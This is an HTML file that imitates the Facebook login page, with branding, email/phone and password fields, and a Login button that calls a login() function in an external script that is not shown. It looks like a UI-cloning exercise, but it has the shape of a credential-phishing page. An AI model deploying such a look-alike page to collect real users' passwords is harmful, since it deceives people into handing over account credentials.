<!DOCTYPE html>
<html lang="en">

<head>
    <title>Facebook Login</title>
    <link rel="stylesheet" href="assets/facebook.css">
    <script src="assets/facebook.js"></script>
</head>

<body>
    <main>
        <div class="mctn">
            <div class="col-logo">
                <img src="images/FACE.svg" alt="Logo">
                <h2>Connect with friends and the world around you on Facebook..</h2>
            </div>
            <div class="ctn-form">
                <div class="form-container">
                    <input type="text" id="email" placeholder="Email address or phone number">
                    <input type="password" id="password" placeholder="Password">
                    <button class="btn-login" onclick="login()">Login</button>
                    <a href="create-account.html">Create new Account</a>
                </div>
                <p><a href="#"><b>Create a Page</b></a> for a celebrity, brand or business.</p>
            </div>
        </div>
    </main>
</body>

</html>
